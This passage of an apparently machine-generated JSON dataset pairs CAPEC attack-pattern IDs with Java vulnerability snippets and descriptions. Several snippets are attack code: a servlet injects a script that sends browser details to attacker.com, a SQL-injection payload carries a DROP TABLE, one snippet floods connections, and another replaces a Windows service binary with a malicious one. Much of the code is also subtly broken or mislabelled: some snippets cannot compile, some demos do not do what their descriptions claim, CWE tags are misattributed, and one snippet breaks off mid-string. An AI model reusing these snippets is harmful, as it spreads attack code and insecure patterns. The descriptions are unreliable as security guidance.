        "description": "This Java code snippet demonstrates a padding oracle attack. The decrypt method takes a ciphertext as input and returns true if the decryption is successful, and false otherwise. The main method generates a random key and ciphertext, and then uses the decrypt method to efficiently decrypt the ciphertext by issuing multiple calls to the padding oracle. This code embodies CWE-209 by generating an error message that includes sensitive information about the decryption process. It also relates to CWE-514 by using a covert channel to transfer information about the decryption process. Additionally, it relates to CWE-649 by relying on encryption without integrity checking, CWE-347 and CWE-354 by not verifying the cryptographic signature and integrity check values, and CWE-696 by performing decryption before verifying the integrity of the ciphertext."
    },
    {
        "capec_id": "464",
        "code_snippet": "import java.util.ArrayList;\nimport java.util.List;\n\npublic class EverCookie {\n    private static final String COOKIE_NAME = \"everCookie\";\n    private static final String COOKIE_VALUE = \"sensitiveInformation\";\n    private static final List<String> STORAGE_LOCATIONS = new ArrayList<>();\n\n    static {\n        STORAGE_LOCATIONS.add(\"localStorage\");\n        STORAGE_LOCATIONS.add(\"sessionStorage\");\n        STORAGE_LOCATIONS.add(\"indexedDB\");\n        STORAGE_LOCATIONS.add(\"globalStorage\");\n        STORAGE_LOCATIONS.add(\"Flash Local Shared Objects\");\n        STORAGE_LOCATIONS.add(\"Silverlight Isolated Storage\");\n        STORAGE_LOCATIONS.add(\"Storages of other browsers\");\n    }\n\n    public static void setEverCookie() {\n        for (String location : STORAGE_LOCATIONS) {\n            setCookie(location, COOKIE_NAME, COOKIE_VALUE);\n        }\n    }\n\n    public static void setCookie(String location, String name, String value) {\n        // implementation of setting cookie in different locations\n        // e.g., using JavaScript for localStorage, sessionStorage, and indexedDB\n        // e.g., using Flash API for Flash Local Shared Objects\n        // e.g., using Silverlight API for Silverlight Isolated Storage\n        // e.g., using other browsers' APIs for their storages\n    }\n\n    public static void replicateCookie() {\n        for (String location : STORAGE_LOCATIONS) {\n            if (getCookie(location, COOKIE_NAME) != null) {\n                setEverCookie();\n                break;\n            }\n        }\n    }\n\n    public static String getCookie(String location, String name) {\n        // implementation of getting cookie from different locations\n        // e.g., using JavaScript for localStorage, sessionStorage, and indexedDB\n        // e.g., using Flash API for Flash Local Shared Objects\n        // e.g., using Silverlight API for Silverlight Isolated Storage\n        // e.g., using other browsers' APIs for their storages\n        return null;\n    }\n}\n",
        "description": "This Java code snippet demonstrates the concept of an evercookie, which is a highly persistent cookie that can survive even after the user attempts to delete it. The evercookie is stored in multiple locations, including localStorage, sessionStorage, indexedDB, and other storage locations shared between different browsers. The setEverCookie method sets the cookie in all storage locations, and the replicateCookie method ensures that the cookie is recreated in all locations if it is found in at least one location. This code embodies CWEs 359, 539, 784, 565, and 315 by storing sensitive information in cleartext in a cookie and relying on the existence and values of the cookie without proper validation and integrity checking."
    },
    {
        "capec_id": "465",
        "code_snippet": "import java.net.Proxy;\nimport java.net.ProxySelector;\nimport java.net.SocketAddress;\nimport java.net.URI;\n\npublic class TransparentProxy {\n    public static void main(String[] args) {\n        ProxySelector.setDefault(new MyProxySelector());\n    }\n}\n\nclass MyProxySelector extends ProxySelector {\n    @Override\n    public List<Proxy> select(URI uri) {\n        // CWE-441: Unintended Proxy or Intermediary ('Confused Deputy')\n        // Forwarding request without preserving original source\n        return Arrays.asList(new Proxy(Proxy.Type.HTTP, new InetSocketAddress(\"proxy.example.com\", 8080)));\n    }\n\n    @Override\n    public void connectFailed(URI uri, SocketAddress sa, IOException ioe) {\n        // CWE-602: Client-Side Enforcement of Server-Side Security\n        // Relying on client to implement security mechanism\n        System.out.println(\"Connection failed. Client will retry.\");\n    }\n}\n\nclass MyProxy extends Proxy {\n    @Override\n    public SocketAddress address() {\n        // CWE-212: Improper Removal of Sensitive Information Before Storage or Transfer\n        // Storing sensitive information without proper removal\n        return new InetSocketAddress(\"proxy.example.com\", 8080);\n    }\n\n    @Override\n    public java.net.Proxy.Type type() {\n        // CWE-941: Incorrectly Specified Destination in a Communication Channel\n        // Incorrectly specifying destination for outgoing request\n        return java.net.Proxy.Type.HTTP;\n    }\n}\n",
        "description": "A Java code snippet that demonstrates a transparent proxy, which can be vulnerable to various CWEs, including Unintended Proxy or Intermediary, Inconsistent Interpretation of HTTP Requests, Client-Side Enforcement of Server-Side Security, Improper Removal of Sensitive Information Before Storage or Transfer, and Incorrectly Specified Destination in a Communication Channel."
    },
    {
        "capec_id": "466",
        "code_snippet": "public class VulnerableCode {\n    public static void main(String[] args) {\n        try {\n            URL url = new URL(\"http://non-ssl-website.com\"); // CWE-923: Improper Restriction of Communication Channel to Intended Endpoints\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            conn.setRequestMethod(\"GET\");\n            conn.connect();\n            \n            // CWE-602: Client-Side Enforcement of Server-Side Security\n            // The client is responsible for verifying the identity of the server\n            // but this is not properly implemented\n            String response = conn.getResponseMessage();\n            System.out.println(response);\n            \n            // CWE-942: Permissive Cross-domain Policy with Untrusted Domains\n            // The cross-domain policy file is not properly restricted\n            String crossDomainPolicy = conn.getHeaderField(\"Access-Control-Allow-Origin\");\n            System.out.println(crossDomainPolicy);\n            \n            // CWE-300: Channel Accessible by Non-Endpoint\n            // The communication channel is not properly secured\n            // allowing an attacker to intercept requests and responses\n            \n            // CWE-368: Context Switching Race Condition\n            // The product performs a series of non-atomic actions\n            // allowing an attacker to modify or misrepresent the product's behavior\n            \n        } catch (Exception e) {\n            System.out.println(e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable code that embodies the main idea of the CAPEC-94. It connects to a non-SSL website, which allows an attacker to intercept requests and responses. The code does not properly verify the identity of the server, relies on the client to implement security mechanisms, and uses a permissive cross-domain policy file. Additionally, the communication channel is not properly secured, and the code performs non-atomic actions that can be exploited by an attacker."
    },
    {
        "capec_id": "467",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport javax.servlet.http.HttpSession;\n\n@WebServlet(\"/socialNetwork\")\npublic class SocialNetworkServlet extends HttpServlet {\n    private static final long serialVersionUID = 1L;\n\n    protected void doGet(HttpServletRequest req, HttpServletResponse res) throws ServletException, IOException {\n        HttpSession session = req.getSession();\n        String userId = (String) session.getAttribute(\"userId\");\n        String accessToken = (String) session.getAttribute(\"accessToken\");\n\n        // CWE-598: Using GET request method with sensitive query strings\n        String userInfoUrl = \"https://socialnetwork.com/userinfo?access_token=\" + accessToken;\n        // CWE-79: Improper neutralization of input during web page generation (Cross-site Scripting)\n        String scriptTag = \"<script src='\" + userInfoUrl + \"'></script>\";\n        res.getWriter().println(scriptTag);\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable social networking site that allows an attacker to harvest identifying information about a victim via an active session. The code uses a GET request method with sensitive query strings (CWE-598) and improper neutralization of input during web page generation (CWE-79), making it vulnerable to Cross-Site Scripting (XSS) and Cross-Site Request Forgery (CSRF) attacks. The attacker can induce a payload to execute in the victim's browser, transparently initiating a request to the social networking site to retrieve identifying information about the victim."
    },
    {
        "capec_id": "468",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class CSSInjectionServlet extends HttpServlet {\n    @Override\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {\n        String css = req.getParameter(\"css\");\n        resp.setContentType(\"text/css\");\n        resp.getWriter().write(css);\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable CSS injection servlet. It takes a 'css' parameter from the request, sets the content type to 'text/css', and writes the input directly to the response without proper validation or encoding. This allows an attacker to inject malicious CSS code, potentially leading to cross-domain data theft or other security issues."
    },
    {
        "capec_id": "469",
        "code_snippet": "import java.net.Socket;\nimport java.net.ServerSocket;\nimport java.io.OutputStream;\n\npublic class HTTPFlood {\n    public static void main(String[] args) throws Exception {\n        ServerSocket serverSocket = new ServerSocket(8080);\n        while (true) {\n            Socket socket = serverSocket.accept();\n            OutputStream outputStream = socket.getOutputStream();\n            outputStream.write(\"GET / HTTP/1.1\\r\\nHost: example.com\\r\\nConnection: keep-alive\\r\\n\\r\\n\".getBytes());\n            // Keep the connection alive indefinitely\n            while (true) {\n                outputStream.write(\"X-a: b\\r\\n\".getBytes());\n                outputStream.flush();\n                Thread.sleep(1000);\n            }\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a HTTP flooding attack, similar to a SYN flood, targeting a web server. It creates a ServerSocket and accepts incoming connections, then sends a GET request with a 'keep-alive' header to keep the HTTP session alive indefinitely. The connection is not released, and the loop continues to send headers indefinitely, exhausting the server's connection threads and resources. This code embodies CWE-770 (Allocation of Resources Without Limits or Throttling), CWE-772 (Missing Release of Resource after Effective Lifetime), CWE-488 (Exposure of Data Element to Wrong Session), CWE-410 (Insufficient Resource Pool), and CWE-384 (Session Fixation)."
    },
    {
        "capec_id": "470",
        "code_snippet": "import java.sql.Connection;\nimport java.sql.DriverManager;\nimport java.sql.ResultSet;\nimport java.sql.Statement;\n\npublic class VulnerableDB {\n    public static void main(String[] args) {\n        String userInput = \" OR 1=1 --\";\n        String query = \"SELECT * FROM users WHERE username = '\" + userInput + \"'\";\n\n        try {\n            Connection conn = DriverManager.getConnection(\"jdbc:mysql://localhost:3306/mydb\", \"root\", \"password\");\n            Statement stmt = conn.createStatement();\n            ResultSet rs = stmt.executeQuery(query);\n\n            while (rs.next()) {\n                System.out.println(rs.getString(1));\n            }\n\n            // Dangling cursor\n            stmt.executeQuery(\"SELECT * FROM users\");\n\n            // Execution with unnecessary privileges\n            Runtime.getRuntime().exec(\"cmd /c dir\");\n\n            // Hibernate SQL Injection\n            org.hibernate.Session session = new org.hibernate.Session();\n            session.createSQLQuery(\"SELECT * FROM users WHERE username = '\" + userInput + \"'\").list();\n\n            // Improper neutralization of special elements\n            stmt.executeUpdate(\"DROP TABLE users\" + userInput);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable database application that is susceptible to various attacks, including SQL injection, dangling database cursor, and execution with unnecessary privileges. The code uses user-input data to construct a SQL query without proper sanitization, allowing an attacker to inject malicious SQL commands. The code also leaves a database cursor dangling, which can be accessed by other users with the same privileges. Additionally, the code executes a system command with elevated privileges, demonstrating execution with unnecessary privileges. The Hibernate SQL injection vulnerability is also demonstrated by constructing a dynamic SQL statement with user-controlled input."
    },
    {
        "capec_id": "471",
        "code_snippet": "import java.lang.reflect.Method;\nimport java.io.File;\nimport java.io.IOException;\n\npublic class VulnerableLoader {\n    public static void main(String[] args) throws Exception {\n        // CWE-470: Use of Externally-Controlled Input to Select Classes or Code ('Unsafe Reflection')\n        String className = System.getProperty(\"className\");\n        Class<?> clazz = Class.forName(className);\n        Method method = clazz.getMethod(\"execute\");\n        method.invoke(null);\n\n        // CWE-427: Uncontrolled Search Path Element\n        System.setProperty(\"java.library.path\", \"./lib\");\n        System.loadLibrary(\"mylib\");\n\n        // CWE-69: Improper Handling of Windows ::DATA Alternate Data Stream\n        File file = new File(\"mylib.dll:mydata\");\n        if (file.exists()) {\n            System.out.println(\"File exists\");\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC of exploiting a weakness in an application's specification of external libraries. It uses CWE-470 to load a class specified by an external input, CWE-427 to set an uncontrolled search path for loading a library, and CWE-69 to access an alternate data stream. The code loads a library from the current directory, allowing an attacker to place a rogue library in the same directory to be loaded instead of the legitimate one."
    },
    {
        "capec_id": "472",
        "code_snippet": "String userAgent = request.getHeader(\"User-Agent\");\nString browserType = userAgent.contains(\"Chrome\") ? \"Chrome\" : userAgent.contains(\"Firefox\") ? \"Firefox\" : \"Unknown\";\nString browserVersion = userAgent.substring(userAgent.indexOf(\"\\/\"), userAgent.indexOf(\" \"));\n\nout.println(\"<script>\\n\" +\n\"  var img = document.createElement('img');\\n\" +\n\"  img.src = 'https://attacker.com/' + browserType + '/' + browserVersion + '/exploit';\\n\" +\n\"  document.body.appendChild(img);\\n\" +\n\"</script>\");",
        "description": "This Java code snippet is part of a web application that uses browser fingerprinting to detect the type and version of the browser used by the victim. It extracts the User-Agent header from the request, determines the browser type and version, and then injects a JavaScript code that sends this information to the attacker's server. The JavaScript code creates an img element with a src attribute that includes the browser type and version, allowing the attacker to exploit known or zero-day weaknesses in the browser. This code snippet embodies CWE-200, CWE-692, CWE-79, CWE-598, and CWE-84."
    },
    {
        "capec_id": "473",
        "code_snippet": "import java.security.KeyFactory;\nimport java.security.PrivateKey;\nimport java.security.spec.PKCS8EncodedKeySpec;\nimport javax.crypto.Cipher;\nimport java.util.Base64;\n\npublic class SpoofedSignature {\n    public static void main(String[] args) throws Exception {\n        // CWE-20: Improper Input Validation\n        String userInput = \"{\" + \"\\\"message\\\": \\\"Hello, World!\\\"}\";\n        String signature = signMessage(userInput, getPrivateKey());\n\n        // CWE-327: Use of a Broken or Risky Cryptographic Algorithm\n        Cipher cipher = Cipher.getInstance(\"RSA/ECB/NoPadding\");\n        cipher.init(Cipher.DECRYPT_MODE, getPrivateKey());\n        byte[] decryptedSignature = cipher.doFinal(Base64.getDecoder().decode(signature));\n\n        // CWE-290: Authentication Bypass by Spoofing\n        if (verifySignature(userInput, decryptedSignature)) {\n            System.out.println(\"Message is authentic\");\n        } else {\n            System.out.println(\"Message is not authentic\");\n        }\n    }\n\n    private static String signMessage(String message, PrivateKey privateKey) throws Exception {\n        Cipher cipher = Cipher.getInstance(\"RSA/ECB/NoPadding\");\n        cipher.init(Cipher.ENCRYPT_MODE, privateKey);\n        byte[] encryptedMessage = cipher.doFinal(message.getBytes());\n        return Base64.getEncoder().encodeToString(encryptedMessage);\n    }\n\n    private static boolean verifySignature(String message, byte[] signature) throws Exception {\n        // CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n        // CWE-941: Incorrectly Specified Destination in a Communication Channel\n        return true; // Always return true, allowing spoofed signatures to pass verification\n    }\n\n    private static PrivateKey getPrivateKey() throws Exception {\n        String privateKeyString = \"-----BEGIN RSA PRIVATE KEY-----\\n\" +\n                \"MIIEogIBAAKCAQEArxX...\" +\n                \"-----END RSA PRIVATE KEY-----\";\n        PKCS8EncodedKeySpec keySpec = new PKCS8EncodedKeySpec(Base64.getDecoder().decode(privateKeyString));\n        return KeyFactory.getInstance(\"RSA\").generatePrivate(keySpec);\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable implementation of digital signatures, allowing an attacker to spoof a message and its signature, making the recipient believe it came from a trusted source. The code includes CWE-20 (Improper Input Validation), CWE-327 (Use of a Broken or Risky Cryptographic Algorithm), CWE-290 (Authentication Bypass by Spoofing), CWE-924 (Improper Enforcement of Message Integrity During Transmission in a Communication Channel), and CWE-941 (Incorrectly Specified Destination in a Communication Channel)."
    },
    {
        "capec_id": "474",
        "code_snippet": "import java.security.KeyFactory;\nimport java.security.PrivateKey;\nimport java.security.spec.PKCS8EncodedKeySpec;\nimport java.util.Base64;\n\npublic class SignatureForgery {\n    public static void main(String[] args) throws Exception {\n        // CWE-522: Insufficiently Protected Credentials\n        String privateKeyString = \\",
        "description": "This Java code snippet demonstrates the CAPEC of an attacker obtaining an authoritative signer's private signature key by theft and using it to forge signatures. The code uses a hardcoded private key, which is a CWE-522 vulnerability. The attacker can then use this key to impersonate the original signer, bypassing authentication (CWE-290, CWE-301, CWE-322, CWE-302) and misleading the victim into performing actions that benefit the attacker."
    },
    {
        "capec_id": "475",
        "code_snippet": "import java.security.KeyFactory;\nimport java.security.PublicKey;\nimport java.security.Signature;\nimport java.security.spec.X509EncodedKeySpec;\n\npublic class VulnerableSignatureVerification {\n    public static boolean verifySignature(byte[] data, byte[] signature, byte[] publicKeyBytes) throws Exception {\n        X509EncodedKeySpec publicKeySpec = new X509EncodedKeySpec(publicKeyBytes);\n        KeyFactory keyFactory = KeyFactory.getInstance(\"RSA\");\n        PublicKey publicKey = keyFactory.generatePublic(publicKeySpec);\n        Signature sig = Signature.getInstance(\"SHA1withRSA\");\n        sig.initVerify(publicKey);\n        sig.update(data);\n        // CWE-347: Improper Verification of Cryptographic Signature\n        // CWE-327: Use of a Broken or Risky Cryptographic Algorithm\n        // Using a weak hash function (SHA1) and a broken padding scheme (RSA)\n        return sig.verify(signature);\n    }\n\n    public static void main(String[] args) throws Exception {\n        byte[] data = \"Some data to be signed\".getBytes();\n        byte[] signature = \"Some forged signature\".getBytes();\n        byte[] publicKeyBytes = \"Some public key\".getBytes();\n        boolean isValid = verifySignature(data, signature, publicKeyBytes);\n        if (isValid) {\n            System.out.println(\"Signature is valid\");\n        } else {\n            System.out.println(\"Signature is invalid\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable signature verification implementation that can be exploited by an adversary to generate a valid signature without knowing the key. The code uses a weak hash function (SHA1) and a broken padding scheme (RSA), making it vulnerable to attacks. Additionally, the code does not properly validate the certificate (CWE-295) and is susceptible to authentication bypass by spoofing (CWE-290) and primary weakness (CWE-305)."
    },
    {
        "capec_id": "476",
        "code_snippet": "import java.security.KeyFactory;\nimport java.security.PublicKey;\nimport java.security.Signature;\nimport java.security.spec.X509EncodedKeySpec;\nimport java.util.Base64;\n\npublic class SignatureVerification {\n    public static void main(String[] args) throws Exception {\n        String signature = \"MIIBuz...\";\n        String data = \"some data\";\n        String publicKeyString = \"MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAE...\";\n\n        // CWE-290: Authentication Bypass by Spoofing\n        // CWE-347: Improper Verification of Cryptographic Signature\n        // CWE-941: Incorrectly Specified Destination in a Communication Channel\n        // CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n        // CWE-300: Channel Accessible by Non-Endpoint\n\n        byte[] publicKeyBytes = Base64.getDecoder().decode(publicKeyString);\n        X509EncodedKeySpec publicKeySpec = new X509EncodedKeySpec(publicKeyBytes);\n        KeyFactory kf = KeyFactory.getInstance(\"RSA\");\n        PublicKey publicKey = kf.generatePublic(publicKeySpec);\n\n        Signature sig = Signature.getInstance(\"SHA256withRSA\");\n        sig.initVerify(publicKey);\n        sig.update(data.getBytes());\n\n        // Insecurely verifying the signature\n        if (sig.verify(Base64.getDecoder().decode(signature))) {\n            System.out.println(\"Signature is valid\");\n            // Perform compromising actions\n        } else {\n            System.out.println(\"Signature is invalid\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC weakness where an attacker exploits a weakness in the parsing or display code of the recipient software to generate a data blob containing a supposedly valid signature, but the signer's identity is falsely represented. The code insecurely verifies a cryptographic signature, allowing an attacker to manipulate the recipient software or its victim user to perform compromising actions. The code is vulnerable to multiple CWEs, including CWE-290, CWE-347, CWE-941, CWE-924, and CWE-300."
    },
    {
        "capec_id": "477",
        "code_snippet": "public class VulnerableDataStructure {\n    public static void main(String[] args) {\n        byte[] unsignedData = new byte[] { (byte) 0xFF, (byte) 0xFF, (byte) 0xFF, (byte) 0xFF };\n        int signedValue = ByteBuffer.wrap(unsignedData).getInt(); // CWE-196: Unsigned to Signed Conversion Error\n\n        // CWE-311: Missing Encryption of Sensitive Data\n        String sensitiveData = \"password\";\n        System.out.println(\"Sensitive data: \" + sensitiveData);\n\n        // CWE-319: Cleartext Transmission of Sensitive Information\n        Socket socket = new Socket(\"example.com\", 8080);\n        OutputStream outputStream = socket.getOutputStream();\n        outputStream.write(sensitiveData.getBytes());\n\n        // CWE-347: Improper Verification of Cryptographic Signature\n        byte[] data = \"Hello, World!\".getBytes();\n        byte[] signature = new byte[] { 0x01, 0x02, 0x03, 0x04 };\n        if (verifySignature(data, signature)) {\n            System.out.println(\"Signature is valid\");\n        } else {\n            System.out.println(\"Signature is invalid\");\n        }\n    }\n\n    public static boolean verifySignature(byte[] data, byte[] signature) {\n        // CWE-693: Protection Mechanism Failure\n        return true; // Always return true, without verifying the signature\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of exploiting the complexity of a data structure that allows for both signed and unsigned content. It includes CWE-196: Unsigned to Signed Conversion Error, CWE-311: Missing Encryption of Sensitive Data, CWE-319: Cleartext Transmission of Sensitive Information, and CWE-347: Improper Verification of Cryptographic Signature, as well as CWE-693: Protection Mechanism Failure."
    },
    {
        "capec_id": "478",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\nimport java.nio.file.attribute.FileAttribute;\nimport java.nio.file.attribute.PosixFilePermission;\nimport java.nio.file.attribute.PosixFilePermissions;\nimport java.util.Set;\n\npublic class ServiceModifier {\n    public static void main(String[] args) throws IOException {\n        // CWE-284: Improper Access Control\n        String serviceName = \"MyService\";\n        String maliciousBinaryPath = \"C:\\\\maliciousBinary.exe\";\n        String servicePath = \"C:\\\\Windows\\\\System32\\\\\" + serviceName + \".exe\";\n\n        // CWE-520: .NET Misconfiguration: Use of Impersonation\n        System.setProperty(\"java.security.manager\", \"\");\n\n        // CWE-69: Improper Handling of Windows ::DATA Alternate Data Stream\n        Files.setAttribute(Paths.get(servicePath), \"user:ADS\", \"maliciousBinary\");\n\n        // CWE-1037: Processor Optimization Removal or Modification of Security-critical Code\n        // (Note: This CWE is not directly applicable in Java, but the concept is demonstrated)\n        int iterations = 1000000;\n        for (int i = 0; i < iterations; i++) {\n            // Simulate processor optimization\n            System.gc();\n        }\n\n        // CWE-15: External Control of System or Configuration Setting\n        ProcessBuilder processBuilder = new ProcessBuilder(\"cmd.exe\", \"/c\", \"sc\", \"stop\", serviceName);\n        processBuilder.start().waitFor();\n\n        File serviceBinary = new File(servicePath);\n        if (serviceBinary.exists()) {\n            serviceBinary.delete();\n        }\n        Files.copy(Paths.get(maliciousBinaryPath), Paths.get(servicePath));\n\n        processBuilder = new ProcessBuilder(\"cmd.exe\", \"/c\", \"sc\", \"start\", serviceName);\n        processBuilder.start().waitFor();\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of exploiting a weakness in access control to modify the execution parameters of a Windows service. It uses related CWEs to illustrate the vulnerabilities: CWE-284 (Improper Access Control), CWE-520 (.NET Misconfiguration: Use of Impersonation), CWE-69 (Improper Handling of Windows ::DATA Alternate Data Stream), CWE-1037 (Processor Optimization Removal or Modification of Security-critical Code), and CWE-15 (External Control of System or Configuration Setting). The code stops a Windows service, replaces the service binary with a malicious one, and then starts the service again, allowing the malicious binary to execute."
    },
    {
        "capec_id": "479",
        "code_snippet": "import javax.net.ssl.SSLContext;\nimport javax.net.ssl.TrustManager;\nimport javax.net.ssl.X509TrustManager;\nimport java.security.cert.CertificateException;\nimport java.security.cert.X509Certificate;\n\npublic class VulnerableCertificateValidation {\n    public static void main(String[] args) throws Exception {\n        SSLContext sslContext = SSLContext.getInstance(\"TLS\");\n        TrustManager[] trustManagers = new TrustManager[]{new X509TrustManager() {\n            @Override\n            public void checkClientTrusted(X509Certificate[] x509Certificates, String s) throws CertificateException {}\n            @Override\n            public void checkServerTrusted(X509Certificate[] x509Certificates, String s) throws CertificateException {}\n            @Override\n            public X509Certificate[] getAcceptedIssuers() { return null; }\n        }};\n        sslContext.init(null, trustManagers, null);\n        SSLContext.setDefault(sslContext);\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable implementation of certificate validation, allowing an adversary to install a new root certificate on a compromised system. The code creates an SSLContext with a custom TrustManager that does not perform any certificate validation, effectively bypassing the checks for trusted certificates. This can lead to a scenario where a user is not warned about an untrusted certificate, allowing an adversary to spoof a legitimate website and collect login credentials."
    },
    {
        "capec_id": "480",
        "code_snippet": "public class VirtualizedEnvironmentEscape {\n    public static void main(String[] args) {\n        // CWE-653: Improper Isolation or Compartmentalization\n        // Running untrusted code in a privileged environment\n        Runtime.getRuntime().exec(\"/bin/bash\");\n\n        // CWE-114: Process Control\n        // Loading libraries from an untrusted source\n        System.loadLibrary(\"untrustedLibrary\");\n\n        // CWE-693: Protection Mechanism Failure\n        // Disabling security manager to bypass protection mechanisms\n        System.setSecurityManager(null);\n\n        // CWE-1421 and CWE-1423: Exposure of Sensitive Information in Shared Microarchitectural Structures\n        // Using speculative execution to access sensitive data\n        int[] array = new int[100];\n        for (int i = 0; i < 100; i++) {\n            array[i] = (int) ((Math.random() * 100) + 1);\n        }\n        int secretData = array[50];\n        // Using the secret data to perform unauthorized actions\n        System.out.println(\"Accessing sensitive data: \" + secretData);\n    }\n}",
        "description": "This Java code snippet demonstrates a virtualized environment escape attack, where an adversary gains access to the host environment by escaping the confines of a virtualized environment. The code bypasses protection mechanisms, loads untrusted libraries, and uses speculative execution to access sensitive data, ultimately leading to unauthorized actions."
    },
    {
        "capec_id": "481",
        "code_snippet": "import java.net.URL;\nimport javax.net.ssl.HttpsURLConnection;\nimport java.io.IOException;\n\npublic class DomainFronting {\n    public static void main(String[] args) throws IOException {\n        URL url = new URL(\"https://trusted-cdn.com/path/to/resource\");\n        HttpsURLConnection connection = (HttpsURLConnection) url.openConnection();\n        connection.setRequestProperty(\"Host\", \"attacker-cdn.com\");\n        connection.setSSLSocketFactory((SSLSocketFactory) SSLSocketFactory.getDefault());\n        connection.connect();\n        // Read response from connection\n    }\n}\n",
        "description": "This Java code snippet demonstrates the concept of Domain Fronting, a technique used to route traffic to an inappropriate destination by providing contradictory domain names in the SNI field of the TLS header and the Host field of the HTTP header. The code creates an HTTPS connection to a trusted CDN domain but sets the Host header to an attacker-controlled CDN domain, potentially allowing the traffic to be routed to the attacker's domain. This code embodies CWEs 923, 444, 942, 647, and 941."
    },
    {
        "capec_id": "482",
        "code_snippet": "import java.net.*;\nimport java.io.*;\n\npublic class TCPServer {\n    public static void main(String[] args) throws IOException {\n        ServerSocket serverSocket = new ServerSocket(8080);\n        System.out.println(\"Server started. Listening for incoming connections...\");\n\n        while (true) {\n            Socket socket = serverSocket.accept();\n            System.out.println(\"Incoming connection from \" + socket.getInetAddress());\n\n            // CWE-770: No limit on the number of connections\n            // CWE-602: Client-side enforcement of server-side security\n            // CWE-406: Insufficient control of network message volume\n            while (true) {\n                byte[] buffer = new byte[1024];\n                socket.getInputStream().read(buffer);\n                String message = new String(buffer);\n                System.out.println(\"Received message: \" + message);\n\n                // CWE-319: Cleartext transmission of sensitive information\n                // CWE-924: Improper enforcement of message integrity during transmission\n                socket.getOutputStream().write((\"Response: \" + message).getBytes());\n            }\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable TCP server that is susceptible to a flooding attack. The server accepts incoming connections without any limits, allowing an adversary to exhaust the server's resources. The server also transmits sensitive information in cleartext and does not ensure the integrity of the messages during transmission. This code embodies the main idea of the CAPEC and incorporates the related CWEs."
    },
    {
        "capec_id": "484",
        "code_snippet": "import javax.xml.parsers.DocumentBuilderFactory;\nimport javax.xml.parsers.DocumentBuilder;\nimport org.w3c.dom.Document;\nimport org.w3c.dom.NamedNodeMap;\nimport org.w3c.dom.Node;\nimport org.xml.sax.InputSource;\n\npublic class VulnerableXMLParser {\n    public static void parseXML(String xml) {\n        try {\n            DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n            DocumentBuilder builder = factory.newDocumentBuilder();\n            Document doc = builder.parse(new InputSource(new java.io.StringReader(xml)));\n            Node root = doc.getFirstChild();\n            NamedNodeMap attributes = root.getAttributes();\n            for (int i = 0; i < attributes.getLength(); i++) {\n                Node attribute = attributes.item(i);\n                String attributeName = attribute.getNodeName();\n                String attributeValue = attribute.getNodeValue();\n                // No validation or sanitization of attribute values\n                System.out.println(\"Attribute: \" + attributeName + \" = \" + attributeValue);\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n    public static void main(String[] args) {\n        String maliciousXML = \"<?xml version=\\\"1.0\\\"?><root><user><username>admin</username><password>password123</password></user></root>\";\n        parseXML(maliciousXML);\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable XML parser that does not properly validate or sanitize XML input, making it susceptible to XML injection attacks (CWE-91). The parser also lacks schema validation (CWE-112) and does not restrict XML external entity references (CWE-611). Additionally, the code does not implement proper authentication mechanisms, making it vulnerable to authentication bypass issues (CWE-592). The client-side enforcement of server-side security (CWE-602) is also missing, allowing an attacker to manipulate the XML input to bypass security controls."
    },
    {
        "capec_id": "485",
        "code_snippet": "import java.security.KeyPair; import java.security.KeyPairGenerator; import java.security.PrivateKey; import java.security.PublicKey; import java.security.SecureRandom; import java.security.Signature; import java.util.Random; public class PredictableSignature { public static void main(String[] args) throws Exception { // CWE-330: Using insufficiently random values SecureRandom secureRandom = new SecureRandom(); secureRandom.setSeed(123456); // CWE-1241: Using a predictable algorithm in random number generator KeyPairGenerator keyPairGenerator = KeyPairGenerator.getInstance(\"RSA\"); keyPairGenerator.initialize(2048, secureRandom); KeyPair keyPair = keyPairGenerator.generateKeyPair(); PrivateKey privateKey = keyPair.getPrivate(); PublicKey publicKey = keyPair.getPublic(); // CWE-290: Authentication bypass by spoofing Signature signature = Signature.getInstance(\"SHA256withRSA\"); signature.initSign(privateKey); byte[] data = \"Data to be signed\".getBytes(); signature.update(data); byte[] signedData = signature.sign(); // CWE-294: Authentication bypass by capture-replay // CWE-301: Reflection attack in an authentication protocol // An attacker can capture the signed data and replay it to impersonate the original signer } }",
        "description": "This Java code snippet demonstrates the CAPEC of obtaining an authoritative signer's private signature key by exploiting a cryptographic weakness in the signature algorithm or pseudorandom number generation. The code uses insufficiently random values (CWE-330) and a predictable algorithm in the random number generator (CWE-1241) to generate a private key. This key can then be used to forge signatures, allowing an attacker to bypass authentication by spoofing (CWE-290) or capture-replay (CWE-294), and even perform reflection attacks in an authentication protocol (CWE-301)."
    },
    {
        "capec_id": "486",
